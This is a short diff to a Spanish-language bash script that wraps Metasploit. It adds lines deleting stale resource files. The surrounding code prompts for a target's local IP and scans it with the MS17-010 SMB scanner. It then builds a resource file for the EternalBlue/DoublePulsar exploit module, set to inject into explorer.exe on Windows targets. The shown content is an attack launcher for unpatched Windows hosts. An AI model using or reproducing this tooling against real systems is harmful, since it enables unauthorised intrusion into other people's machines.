@@ -157,6 +157,10 @@ printf "\e[01;32mIngresa la IP (local) del objetivo:\e[01;31m "
 read target
 echo -e "$purple(*)$blue Iniciando analisis con Metasploit.."
 sleep 2
+if [ -e $directory/check_smb.rc ]
+then
+rm $directory/check_smb.rc
+fi
 echo "
 use auxiliary/scanner/smb/smb_ms17_010
 set RHOSTS $target
@@ -181,6 +185,10 @@ printf "\e[01;32mIngresa la IP (local) del objetivo:\e[01;31m "
 read target
 printf "\e[01;32mIngresa la arquitectura\e[01;34m (x86 o x64):\e[01;31m " 
 read bits
+if [ -e $directory/exploit.rc ]
+then
+rm $directory/exploit.rc
+fi
 echo "
 use exploit/windows/smb/eternalblue_doublepulsar
 set PROCESSINJECT explorer.exe
